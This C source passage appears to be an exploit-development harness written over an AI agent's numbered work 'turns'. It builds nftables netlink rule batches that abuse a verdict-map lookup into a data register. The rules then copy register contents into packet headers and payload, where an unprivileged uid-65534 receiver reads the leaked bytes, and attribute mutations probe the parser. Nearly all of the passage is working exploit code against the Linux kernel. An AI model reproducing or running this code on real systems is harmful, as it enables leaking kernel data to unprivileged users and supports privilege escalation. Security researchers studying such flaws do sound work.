 * prog 7 (control)      : load ; const -> DATA reg ; payload set ; lookup -> VERDICT reg
 * prog 8 (control)      : load ; const -> DATA reg ; payload set ; accept
 *
 * In prog 7 the lookup writes the verdict register, which ends evaluation, so the
 * payload set has to come before it -- and the data register it reads can then only
 * hold the constant, which is the point of the control: same map, same element, same
 * set expression, only the destination register of the lookup differs.
 */
static struct nlmsghdr *op_newrule_exfil(const char *table, const char *chain,
					 const char *set, int prog)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;
	uint32_t src = (uint32_t)(NFT_REG32_00 + g_exfil_off / 4);

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "x.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "x.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "x.exprs");

	exfil_payload_load(nlh, prog == 6 ? (uint32_t)NFT_REG_1 : (uint32_t)NFT_REG32_08);
	if (prog == 6) {
		exfil_lookup(nlh, set, NFT_REG_1, NFT_REG32_00);
		exfil_payload_set(nlh, src, 12);
		exfil_imm_verdict(nlh, NF_ACCEPT);
	} else if (prog == 7) {
		/* the map key is loaded into NFT_REG32_08 (register bytes 32..35) because
		 * the constant below lands in register bytes 0..3, which is where the
		 * key would otherwise live -- turn 532 found this the hard way: the first
		 * version clobbered the key with the constant, the lookup did not find
		 * it, and the control read "dropped" for a reason that had nothing to do
		 * with the door. */
		exfil_imm_value(nlh, NFT_REG32_00, g_exfil_const, 4);
		exfil_payload_set(nlh, src, 12);
		exfil_lookup(nlh, set, NFT_REG32_08, NFT_REG_VERDICT);
	} else if (prog == 8) {
		exfil_imm_value(nlh, NFT_REG32_00, g_exfil_const, 4);
		exfil_payload_set(nlh, src, 12);
		exfil_imm_verdict(nlh, NF_ACCEPT);
	} else {
		return NULL;
	}

	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---------- turn 533: the bandwidth rule ---------- */

/* payload set: `len` bytes from register word `sreg` into `base` at `off` */
static void reg_payload_set(struct nlmsghdr *nlh, uint32_t sreg, uint32_t base,
			    uint32_t off, uint32_t len)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "r.st.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "r.st.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "r.st.data");
	put_be32(nlh, NFTA_PAYLOAD_SREG, sreg, "r.st.sreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, base, "r.st.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "r.st.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, len, "r.st.len");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

/* prog 9  (door, full) : load ; lookup -> DATA reg ; 16B payload + saddr + tos
 * prog 10 (door, hdr)  : the same rule WITHOUT the 16-byte payload write
 * prog 11 (door, pay)  : the same rule WITHOUT the two header writes
 * prog 12 (ctl, const) : 16-byte constant -> DATA reg ; the same three writes
 * prog 13 (ctl, map)   : constant -> DATA reg ; the writes ; lookup -> VERDICT reg
 *
 * The 16 bytes are read from register word 0 (attr NFT_REG32_00), the pointer word
 * from word +2 (attr NFT_REG32_00+2).  nft_validate_register_load() wants
 * reg * 4 + len <= 80 and reg >= 4, which both of these satisfy; a 16-byte write is
 * legal from the first data register on.
 */
#define R_FULL  9
#define R_HDR   10
#define R_PAY   11
#define R_CONST 12
#define R_MAPV  13

/* turn 535: the bucket-B program ids are defined next to the code that builds
 * them (further down), but build() dispatches on them, so the sentinel and the
 * rule builder are declared here. */
#define B_NORULE 20
static struct nlmsghdr *op_newrule_bw(const char *table, const char *chain,
				      int prog);

static struct nlmsghdr *op_newrule_reg(const char *table, const char *chain,
				       const char *set, int prog)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;
	uint32_t w0 = (uint32_t)NFT_REG32_00;       /* register bytes 0..3  */
	uint32_t w8 = (uint32_t)(NFT_REG32_00 + 2); /* register bytes 8..11 */
	int want_pay = (prog == R_FULL || prog == R_PAY || prog == R_CONST ||
			prog == R_MAPV);
	int want_hdr = (prog == R_FULL || prog == R_HDR || prog == R_CONST ||
			prog == R_MAPV);

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "r.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "r.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "r.exprs");

	switch (prog) {
	case R_FULL:
	case R_HDR:
	case R_PAY:
		exfil_payload_load(nlh, NFT_REG_1);
		exfil_lookup(nlh, set, NFT_REG_1, NFT_REG32_00);
		break;
	case R_CONST:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 16);
		break;
	case R_MAPV:
		/* the key lives in register bytes 32..35, because the 16-byte constant
		 * overwrites bytes 0..15 -- the turn-532 lesson, applied in advance */
		exfil_payload_load(nlh, NFT_REG32_08);
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 16);
		break;
	default:
		return NULL;
	}

	if (want_pay)
		reg_payload_set(nlh, w0, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
	if (want_hdr) {
		reg_payload_set(nlh, w8, NFT_PAYLOAD_NETWORK_HEADER, 12, 4);
		reg_payload_set(nlh, w0, NFT_PAYLOAD_NETWORK_HEADER, 1, 1);
	}

	if (prog == R_MAPV)
		exfil_lookup(nlh, set, NFT_REG32_08, NFT_REG_VERDICT);
	else
		exfil_imm_verdict(nlh, NF_ACCEPT);

	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---------- assembly ---------- */

static int op_off[MAX_OPS];

static int assemble(char *buf, int bufsz)
{
	struct nlmsghdr *nlh;
	int off, i;

	if (nops > MAX_OPS)
		return -1;
	nlh = msg_start(buf, NFNL_MSG_BATCH_BEGIN, NLM_F_REQUEST, 0);
	((struct nfgenmsg_ *)NLMSG_DATA(nlh))->res_id = htons(NFNL_SUBSYS_NFTABLES);
	off = (int)NLMSG_ALIGN(nlh->nlmsg_len);
	for (i = 0; i < nops; i++) {
		struct nlmsghdr *m = (struct nlmsghdr *)opbuf[i];
		if (off + (int)NLMSG_ALIGN(m->nlmsg_len) + 64 > bufsz)
			return -1;
		op_off[i] = off;
		memcpy(buf + off, m, NLMSG_ALIGN(m->nlmsg_len));
		off += (int)NLMSG_ALIGN(m->nlmsg_len);
	}
	nlh = msg_start(buf + off, NFNL_MSG_BATCH_END, NLM_F_REQUEST, 0);
	((struct nfgenmsg_ *)NLMSG_DATA(nlh))->res_id = htons(NFNL_SUBSYS_NFTABLES);
	off += (int)NLMSG_ALIGN(nlh->nlmsg_len);
	return off;
}

/* ---------- netns setup ---------- */

static int set_addr(const char *dev, uint32_t addr_be)
{
	struct ifreq ifr;
	struct sockaddr_in *sin;
	int s = socket(AF_INET, SOCK_DGRAM, 0);

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", dev);
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
	sin->sin_family = AF_INET;
	sin->sin_addr.s_addr = addr_be;
	if (ioctl(s, SIOCSIFADDR, &ifr) < 0) {
		close(s);
		return -1;
	}
	close(s);
	return 0;
}

static int set_up(const char *dev)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", dev);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
		close(s);
		return -1;
	}
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) {
		close(s);
		return -1;
	}
	close(s);
	return 0;
}

static int netns_setup(void)
{
	if (unshare(CLONE_NEWNET) < 0)
		return -1;
	set_addr("lo", htonl(0x0a000001));   /* 10.0.0.1 */
	set_addr("lo", htonl(0x0a000002));   /* 10.0.0.2 */
	set_addr("lo", htonl(0x0a000003));   /* 10.0.0.3 */
	set_up("lo");
	return 0;
}

/* ---------- netlink io ---------- */

static int nl_open(void)
{
	struct sockaddr_nl sa;
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
	struct timeval tv = { .tv_sec = 0, .tv_usec = 250000 };

	if (fd < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	return fd;
}

static char g_extack[256];
static int g_err;

static int send_batch(int fd, char *buf, int len)
{
	char rbuf[8192];
	int errs = 0;

	g_err = 0;
	g_extack[0] = 0;
	if (send(fd, buf, len, 0) != len)
		return -1000 - errno;
	for (;;) {
		int rl = (int)recv(fd, rbuf, sizeof(rbuf), 0);
		struct nlmsghdr *nlh;
		if (rl < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)
				break;
			break;
		}
		for (nlh = (struct nlmsghdr *)rbuf; NLMSG_OK(nlh, rl);
		     nlh = NLMSG_NEXT(nlh, rl)) {
			if (nlh->nlmsg_type != NLMSG_ERROR)
				continue;
			{
				struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
				if (e->error) {
					int alen = (int)nlh->nlmsg_len -
						   (int)NLMSG_LENGTH(sizeof(*e));
					struct nlattr *a = (struct nlattr *)
						((char *)e + sizeof(*e));
					errs++;
					if (!g_err)
						g_err = e->error;
					while (alen >= (int)sizeof(*a) &&
					       a->nla_len >= sizeof(*a) &&
					       a->nla_len <= alen) {
						if ((a->nla_type & 0x3fff) == 1 &&
						    !g_extack[0])
							snprintf(g_extack,
								 sizeof(g_extack), "%s",
								 (char *)a + NLA_HDRLEN);
						alen -= (int)NLA_ALIGN_(a->nla_len);
						a = (struct nlattr *)((char *)a +
							NLA_ALIGN_(a->nla_len));
					}
				}
			}
		}
	}
	return errs;
}

/* probe: one UDP datagram 10.0.0.1 -> 10.0.0.3:9999 with a real receiver
 * bound on the far side.  A LOCAL_IN drop is silent from the sender's point
 * of view (the packet has already "left"), so the receiver, not sendto, is
 * what tells delivered from dropped.
 *   0            delivered to the receiver
 *   1            dropped (receiver timed out)
 *   2000 + errno sendto() itself failed (the packet never left the stack)
 *   -1 / -2      probe setup failure
 */
static int probe_send(void)
{
	struct sockaddr_in src, dst, rx_a;
	struct timeval tv = { .tv_sec = 0, .tv_usec = 150000 };
	int rx, tx, n, r;
	char payload[8] = "probe";
	char rbuf[64];

	rx = socket(AF_INET, SOCK_DGRAM, 0);
	if (rx < 0)
		return -1;
	memset(&rx_a, 0, sizeof(rx_a));
	rx_a.sin_family = AF_INET;
	rx_a.sin_addr.s_addr = htonl(0x0a000003);
	rx_a.sin_port = htons(9999);
	setsockopt(rx, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	if (bind(rx, (struct sockaddr *)&rx_a, sizeof(rx_a)) < 0) {
		close(rx);
		return -2;
	}
	tx = socket(AF_INET, SOCK_DGRAM, 0);
	if (tx < 0) {
		close(rx);
		return -1;
	}
	memset(&src, 0, sizeof(src));
	src.sin_family = AF_INET;
	src.sin_addr.s_addr = htonl(0x0a000001);
	src.sin_port = htons(1234);
	if (bind(tx, (struct sockaddr *)&src, sizeof(src)) < 0) {
		close(rx);
		close(tx);
		return -2;
	}
	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_addr.s_addr = htonl(0x0a000003);
	dst.sin_port = htons(9999);
	r = (int)sendto(tx, payload, sizeof(payload), 0,
			(struct sockaddr *)&dst, sizeof(dst));
	if (r < 0) {
		r = 2000 + errno;
		close(rx);
		close(tx);
		return r;
	}
	n = (int)recv(rx, rbuf, sizeof(rbuf), 0);
	close(rx);
	close(tx);
	return n > 0 ? 0 : 1;
}

/* ---------- turn 532: the receiver that reads the leaked field ----------
 * Same UDP probe, with two differences that matter for the claim:
 *   - the sending socket disables the UDP checksum (SO_NO_CHECK), because a
 *     payload-set expression rewrites the IPv4 source address, which is part of the
 *     UDP pseudo-header; with a real checksum the packet would be dropped by the
 *     receiver for the wrong reason.  The IP header checksum is verified by ip_rcv
 *     *before* the LOCAL_IN hook, so rewriting the header there is not a checksum
 *     problem at all.
 *   - the datagram is read by a CHILD THAT DROPPED TO uid 65534 before recvfrom(),
 *     and the child proves the drop by checking that setuid(0) now fails.  So the
 *     bytes are read by a process with no capabilities.
 * `leak` is the 4 header bytes of ip saddr read as a big-endian number: for a
 * little-endian u32 W in the register, leak == bswap(W).
 */
struct leak_res {
	int uid;        /* uid that actually called recvfrom */
	int drop_ok;    /* 1 = uid 65534 and setuid(0) was refused */
	int n;          /* bytes received */
	uint32_t leak;  /* source address of the datagram, network order as a number */
};

static int probe_send_leak(uint32_t *leak, int *reader_uid, int *reader_drop)
{
	struct sockaddr_in src, dst, rx_a;
	struct timeval tv = { .tv_sec = 0, .tv_usec = 150000 };
	struct leak_res res;
	int rx, tx, r, pfd[2], status = 0, nread;
	int one = 1;
	char payload[8] = "probe";
	pid_t pid;

	*leak = 0;
	*reader_uid = -1;
	*reader_drop = 0;
	memset(&res, 0, sizeof(res));

	rx = socket(AF_INET, SOCK_DGRAM, 0);
	if (rx < 0)
		return -1;
	memset(&rx_a, 0, sizeof(rx_a));
	rx_a.sin_family = AF_INET;
	rx_a.sin_addr.s_addr = htonl(0x0a000003);
	rx_a.sin_port = htons(9999);
	setsockopt(rx, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	if (bind(rx, (struct sockaddr *)&rx_a, sizeof(rx_a)) < 0) {
		close(rx);
		return -2;
	}
	if (pipe(pfd) < 0) {
		close(rx);
		return -1;
	}
	pid = fork();
	if (pid == 0) {
		struct sockaddr_in from;
		socklen_t fl = sizeof(from);
		char rb[64];
		ssize_t w;

		close(pfd[0]);
		/* drop *after* the socket is bound: binding needs no privilege either,
		 * but this keeps the receive side the only thing under test */
		setgid(65534);
		setuid(65534);
		res.uid = (int)getuid();
		res.drop_ok = (getuid() == 65534 && setuid(0) != 0) ? 1 : 0;
		res.n = (int)recvfrom(rx, rb, sizeof(rb), 0,
				      (struct sockaddr *)&from, &fl);
		if (res.n > 0)
			res.leak = ntohl(from.sin_addr.s_addr);
		w = write(pfd[1], &res, sizeof(res));
		(void)w;
		_exit(0);
	}
	close(pfd[1]);
	close(rx);
	tx = socket(AF_INET, SOCK_DGRAM, 0);
	if (tx < 0) {
		close(pfd[0]);
		waitpid(pid, &status, 0);
		return -1;
	}
	setsockopt(tx, SOL_SOCKET, SO_NO_CHECK, &one, sizeof(one));
	memset(&src, 0, sizeof(src));
	src.sin_family = AF_INET;
	src.sin_addr.s_addr = htonl(0x0a000001);
	src.sin_port = htons(1234);
	if (bind(tx, (struct sockaddr *)&src, sizeof(src)) < 0) {
		close(tx);
		close(pfd[0]);
		waitpid(pid, &status, 0);
		return -2;
	}
	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_addr.s_addr = htonl(0x0a000003);
	dst.sin_port = htons(9999);
	r = (int)sendto(tx, payload, sizeof(payload), 0,
			(struct sockaddr *)&dst, sizeof(dst));
	close(tx);
	nread = (int)read(pfd[0], &res, sizeof(res));
	close(pfd[0]);
	waitpid(pid, &status, 0);
	if (r < 0)
		return 2000 + errno;
	if (nread != (int)sizeof(res))
		return 1;
	*leak = res.leak;
	*reader_uid = res.uid;
	*reader_drop = res.drop_ok;
	return res.n > 0 ? 0 : 1;
}

/* ---------- turn 533: the receiver that reads both channels ----------
 * Same drop-to-uid-65534 discipline as turn 532, but the datagram is read with
 * recvmsg() so that three independent interfaces deliver the same packet:
 *   msg_name            -> the IPv4 source address the rule wrote (4 bytes)
 *   IP_TOS control msg  -> the IPv4 tos byte the rule wrote (1 byte)
 *   the payload itself  -> 16 bytes the rule copied out of the data register
 * plus IP_PKTINFO, which shows the *destination* the packet still carries: it must
 * stay 10.0.0.3, i.e. the rule did not touch the routing-relevant field.
 *
 * Nothing here inspects kernel memory: the bytes are checked against each other
 * (payload[8..11] vs saddr, payload[0] vs tos) and against a constant the reader
 * itself supplied in the control scenarios.
 */
#ifndef IP_RECVTOS
#define IP_RECVTOS 13
#endif
#ifndef IP_PKTINFO
#define IP_PKTINFO 8
#endif

struct reg_res {
	int uid;
	int drop_ok;
	int n;                 /* bytes of payload received, -1 on timeout          */
	unsigned char pay[64]; /* the datagram as it arrived                        */
	uint32_t saddr;        /* ntohl() of the four source-address bytes          */
	uint32_t daddr;        /* ntohl() of the four destination bytes             */
	int tos;               /* tos byte from the control message, -1 if absent   */
};

static int probe_send_reg(struct reg_res *out)
{
	struct sockaddr_in src, dst, rx_a;
	struct timeval tv = { .tv_sec = 0, .tv_usec = 600000 }; /* 536: 150ms was
					   too short for the first packet of a TCG boot */
	unsigned char payload[32];
	int rx, tx, r, pfd[2], status = 0, nread, one = 1, i;
	pid_t pid;

	memset(out, 0, sizeof(*out));
	out->uid = -1;
	out->tos = -1;
	for (i = 0; i < 32; i++)
		payload[i] = (unsigned char)"0123456789abcdefghijklmnopqrstuv"[i];

	rx = socket(AF_INET, SOCK_DGRAM, 0);
	if (rx < 0)
		return -1;
	memset(&rx_a, 0, sizeof(rx_a));
	rx_a.sin_family = AF_INET;
	rx_a.sin_addr.s_addr = htonl(0x0a000003);
	rx_a.sin_port = htons(9999);
	setsockopt(rx, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	setsockopt(rx, IPPROTO_IP, IP_RECVTOS, &one, sizeof(one));
	setsockopt(rx, IPPROTO_IP, IP_PKTINFO, &one, sizeof(one));
	if (bind(rx, (struct sockaddr *)&rx_a, sizeof(rx_a)) < 0) {
		close(rx);
		return -2;
	}
	if (pipe(pfd) < 0) {
		close(rx);
		return -1;
	}
	pid = fork();
	if (pid == 0) {
		struct sockaddr_in from;
		struct iovec iov;
		struct msghdr mh;
		struct cmsghdr *cm;
		char cbuf[512];
		ssize_t w;

		close(pfd[0]);
		setgid(65534);
		setuid(65534);
		out->uid = (int)getuid();
		out->drop_ok = (getuid() == 65534 && setuid(0) != 0) ? 1 : 0;

		memset(&from, 0, sizeof(from));
		memset(&mh, 0, sizeof(mh));
		iov.iov_base = out->pay;
		iov.iov_len = sizeof(out->pay);
		mh.msg_name = &from;
		mh.msg_namelen = sizeof(from);
		mh.msg_iov = &iov;
		mh.msg_iovlen = 1;
		mh.msg_control = cbuf;
		mh.msg_controllen = sizeof(cbuf);

		out->n = (int)recvmsg(rx, &mh, 0);
		if (out->n > 0) {
			out->saddr = ntohl(from.sin_addr.s_addr);
			for (cm = CMSG_FIRSTHDR(&mh); cm; cm = CMSG_NXTHDR(&mh, cm)) {
				if (cm->cmsg_level != IPPROTO_IP)
					continue;
				if (cm->cmsg_type == IP_TOS &&
				    cm->cmsg_len >= CMSG_LEN(1))
					out->tos = *(unsigned char *)CMSG_DATA(cm);
				else if (cm->cmsg_type == IP_PKTINFO &&
					 cm->cmsg_len >= CMSG_LEN(sizeof(struct in_pktinfo)))
					out->daddr = ntohl(((struct in_pktinfo *)
							    CMSG_DATA(cm))->ipi_addr.s_addr);
			}
		}
		w = write(pfd[1], out, sizeof(*out));
		(void)w;
		_exit(0);
	}
	close(pfd[1]);
	close(rx);
	tx = socket(AF_INET, SOCK_DGRAM, 0);
	if (tx < 0) {
		close(pfd[0]);
		waitpid(pid, &status, 0);
		return -1;
	}
	setsockopt(tx, SOL_SOCKET, SO_NO_CHECK, &one, sizeof(one));
	memset(&src, 0, sizeof(src));
	src.sin_family = AF_INET;
	src.sin_addr.s_addr = htonl(0x0a000001);
	src.sin_port = htons(1234);
	if (bind(tx, (struct sockaddr *)&src, sizeof(src)) < 0) {
		close(tx);
		close(pfd[0]);
		waitpid(pid, &status, 0);
		return -2;
	}
	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_addr.s_addr = htonl(0x0a000003);
	dst.sin_port = htons(9999);
	r = (int)sendto(tx, payload, sizeof(payload), 0,
			(struct sockaddr *)&dst, sizeof(dst));
	close(tx);
	nread = (int)read(pfd[0], out, sizeof(*out));
	close(pfd[0]);
	waitpid(pid, &status, 0);
	if (r < 0)
		return 2000 + errno;
	if (nread != (int)sizeof(*out))
		return 1;
	return out->n > 0 ? 0 : 1;
}

/* ---------- one scenario, executed in a child process ---------- */

enum {
	MUT_NONE = 0,
	MUT_TYPE_LO,       /* nla_type ^= 1                        */
	MUT_TYPE_NESTED,   /* nla_type |= NLA_F_NESTED             */
	MUT_TYPE_UNKNOWN,  /* nla_type = 0x3fff  (effectively gone) */
	MUT_ZERO,          /* payload zeroed                       */
	MUT_LASTBYTE,      /* last payload byte ^= 0xff            */
	MUT_LEN_EMPTY,     /* nla_len = 4, payload reinterpreted   */
	MUT__COUNT
};

static const char *mut_name(int m)
{
	static const char *n[] = { "none", "type_lo", "type_nested", "type_unknown",
				   "zero", "lastbyte", "len_empty" };
	return (m >= 0 && m < MUT__COUNT) ? n[m] : "?";
}

struct scen {
	const char *id;
	int prog;       /* 0 lookup_plain, 1 lookup_invert, 2 verdict value grid */
	int mut_rec;    /* index into recs[], -1 for none */
	int mut_kind;
	uint32_t verdict;
};

/* build the program for this scenario into opbuf/recs, return 0 on success
 * prog 0..2 : the turn-529/530 programs (unchanged, log-compatible)
 * prog 3    : verdict map -> DATA register (the 952bf8df2225 door) + cmp probe
 * prog 4    : same objects, no rule (control: what the chain policy alone does)
 * prog 5    : verdict map -> VERDICT register (control: the map itself is legal)
 * prog 6/7/8: the exfiltration program of turn 532 (see op_newrule_exfil)
 */
static int build(int prog, uint32_t verdict)
{
	static const char *TABLE = "dtest";
	static const char *SET = "s";
	static const char *CHAIN = "c";
	static const char *CHAIN2 = "c1";
	static const char *MAP = "vm";

	nops = 0;
	nrecs = 0;

	/* turn 535: bucket-B programs (bitwise/byteorder).  One table, one chain,
	 * one rule, and no set at all -- the readout is the 16-byte payload write,
	 * so the fewer moving parts between the expression and the wire the better.
	 * B_NORULE builds the same table and chain with no rule, which is what
	 * makes "setup=ERR" readable as "no rule" instead of "no packet path". */
	if (prog >= 20) {
		op_newtable(TABLE);
		op_newchain(TABLE, CHAIN, NF_INET_LOCAL_IN, 0, NF_DROP);
		if (prog != B_NORULE &&
		    op_newrule_bw(TABLE, CHAIN, prog) == NULL)
			return -1;
		return 0;
	}

	if (prog >= 3) {
		op_newtable(TABLE);
		op_newchain_regular(TABLE, CHAIN2);
		if (prog >= 6)
			op_newchain_regular(TABLE, "c2");   /* second jump target */
		op_newchain(TABLE, CHAIN, NF_INET_LOCAL_IN, 0, NF_DROP);
		op_newset_map(TABLE, MAP);
		op_newsetelem_vmap(TABLE, MAP, htonl(0x0a000001), g_vcode, g_vchain);
		if (prog == 3)
			op_newrule_vmap(TABLE, CHAIN, MAP, NFT_REG32_00);
		else if (prog == 4)
			;   /* no rule at all */
		else if (prog == 5)
			op_newrule_vmap(TABLE, CHAIN, MAP, NFT_REG_VERDICT);
		else if (prog >= 6 && prog <= 8) {
			if (op_newrule_exfil(TABLE, CHAIN, MAP, prog) == NULL)
				return -1;
		} else if (prog >= 9 && prog <= 13) {
			if (op_newrule_reg(TABLE, CHAIN, MAP, prog) == NULL)
				return -1;
		} else
			return -1;
		return 0;
	}

	op_newtable(TABLE);
	op_newset(TABLE, SET);
	op_newsetelem(TABLE, SET, htonl(0x0a000001), 1 /* catchall */);
	op_newchain(TABLE, CHAIN, NF_INET_LOCAL_IN, 0, NF_DROP);
	if (prog == 0)
		op_newrule_lookup(TABLE, CHAIN, SET, 0, verdict, 1);
	else if (prog == 1)
		op_newrule_lookup(TABLE, CHAIN, SET, 1, verdict, 1);
	else if (prog == 2)
		op_newrule_lookup(TABLE, CHAIN, SET, 0, verdict, 0);
	else
		return -1;
	return 0;
}

static void slug(char *dst, size_t n, const char *src)
{
	size_t i, j = 0;
	for (i = 0; src[i] && j + 1 < n; i++) {
		char c = src[i];
		if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
		    (c >= '0' && c <= '9'))
			dst[j++] = c;
		else if (j && dst[j - 1] != '_')
			dst[j++] = '_';
	}
	while (j && dst[j - 1] == '_')
		j--;
	dst[j] = 0;
	if (!dst[0])
		snprintf(dst, n, "none");
}

static void run_child(const struct scen *sc)
{
	char batch[32768];
	int len, fd, errs, sr;
	char sl[80], el[160];
	char extra[256] = "";

	if (netns_setup() < 0) {
		printf("S %s|setup=NETNS_FAIL|send=-|extack=-", sc->id);
		fflush(stdout);
		_exit(0);
	}
	if (build(sc->prog, sc->verdict) < 0) {
		printf("S %s|setup=BUILD_FAIL|send=-|extack=-", sc->id);
		fflush(stdout);
		_exit(0);
	}
	len = assemble(batch, sizeof(batch));
	if (len < 0) {
		printf("S %s|setup=ASM_FAIL|send=-|extack=-", sc->id);
		fflush(stdout);
		_exit(0);
	}
	if (sc->mut_rec >= 0) {
		struct attr_rec *rc = &recs[sc->mut_rec];
		int abs = op_off[rc->op] + rc->off;
		struct nlattr *a = (struct nlattr *)(batch + abs);
		switch (sc->mut_kind) {
		case MUT_TYPE_LO:
			a->nla_type ^= 1;
			break;
		case MUT_TYPE_NESTED:
			a->nla_type |= NLA_F_NESTED;
			break;
		case MUT_TYPE_UNKNOWN:
			a->nla_type = 0x3fff;
			break;
		case MUT_ZERO:
			memset((char *)a + NLA_HDRLEN, 0, a->nla_len - NLA_HDRLEN);
			break;
		case MUT_LASTBYTE:
			((unsigned char *)a)[a->nla_len - 1] ^= 0xff;
			break;
		case MUT_LEN_EMPTY:
			a->nla_len = NLA_HDRLEN;
			break;
		default:
			break;
		}
	}
	fd = nl_open();
	if (fd < 0) {
		printf("S %s|setup=NL_OPEN_FAIL|send=-|extack=-", sc->id);
		fflush(stdout);
		_exit(0);
	}
	errs = send_batch(fd, batch, len);
	if (g_reg_mode) {
		struct reg_res rr;
		int i;

		sr = probe_send_reg(&rr);
		if (sr == 0) {
			char ph[2 * 16 + 1], th[2 * 8 + 1];

			for (i = 0; i < 16; i++)
				snprintf(ph + 2 * i, 3, "%02x", rr.pay[i]);
			for (i = 0; i < 8; i++)
				snprintf(th + 2 * i, 3, "%02x", rr.pay[16 + i]);
			snprintf(extra, sizeof(extra),
				 "|pay=%s|tail=%s|saddr=%08x|tos=%02x|daddr=%08x|reader=uid%d%s",
				 ph, th, rr.saddr, rr.tos < 0 ? 0 : rr.tos,
				 rr.daddr, rr.uid,
				 rr.drop_ok ? "" : "(DROP_FAILED)");
		} else {
			snprintf(extra, sizeof(extra), "|pay=none|reader=uid%d",
				 rr.uid);
		}
	} else if (g_exfil_mode) {
		uint32_t leak = 0;
		int ruid = -1, rdrop = 0;

		sr = probe_send_leak(&leak, &ruid, &rdrop);
		if (sr == 0)
			snprintf(extra, sizeof(extra), "|leak=%08x|reader=uid%d%s",
				 leak, ruid, rdrop ? "" : "(DROP_FAILED)");
		else
			snprintf(extra, sizeof(extra), "|leak=none|reader=uid%d", ruid);
	} else {
		sr = probe_send();
	}
	slug(sl, sizeof(sl), g_extack[0] ? g_extack : "none");
	if (errs < 0)
		snprintf(el, sizeof(el), "send_failed_errno_%d", -1000 - errs);
	else if (g_err)
		snprintf(el, sizeof(el), "E%d_%s", -g_err, sl);
	else
		snprintf(el, sizeof(el), "%s", sl);
	{
		char sbuf[24];
		if (sr == 0)
			snprintf(sbuf, sizeof(sbuf), "DELIVERED");
		else if (sr == 1)
			snprintf(sbuf, sizeof(sbuf), "DROPPED");
		else if (sr > 2000)
			snprintf(sbuf, sizeof(sbuf), "SENDERR_E%d", sr - 2000);
		else
			snprintf(sbuf, sizeof(sbuf), "PROBEFAIL%d", sr);
		printf("S %s|setup=%s|send=%s|extack=%s%s", sc->id,
		       errs == 0 ? "OK" : "ERR", sbuf, el, extra);
	}
	fflush(stdout);
	close(fd);
	_exit(0);
}

/* run one scenario in a forked child with a timeout, return its output line */
static void run_scenario(const struct scen *sc)
{
	int pfd[2];
	pid_t pid;
	char out[512];
	int n = 0, status = 0;

	if (pipe(pfd) < 0)
		return;
	pid = fork();
	if (pid == 0) {
		close(pfd[0]);
		dup2(pfd[1], 1);
		close(pfd[1]);
		alarm(20);
		run_child(sc);
		_exit(0);
	}
	close(pfd[1]);
	{
		fd_set rfds;
		struct timeval tv;
		int done = 0;
		while (!done) {
			FD_ZERO(&rfds);
			FD_SET(pfd[0], &rfds);
			tv.tv_sec = 25;
			tv.tv_usec = 0;
			if (select(pfd[0] + 1, &rfds, NULL, NULL, &tv) <= 0)
				break;
			{
				int r = (int)read(pfd[0], out + n, sizeof(out) - 1 - n);
				if (r <= 0)
					done = 1;
				else {
					n += r;
					if (n >= (int)sizeof(out) - 1)
						done = 1;
				}
			}
		}
	}
	close(pfd[0]);
	out[n] = 0;
	waitpid(pid, &status, 0);
	if (n == 0) {
		if (WIFSIGNALED(status))
			printf("S %s|setup=CRASH|send=-|extack=signal_%d\n",
			       sc->id, WTERMSIG(status));
		else
			printf("S %s|setup=NOREPLY|send=-|extack=exit_%d\n",
			       sc->id, WEXITSTATUS(status));
	} else {
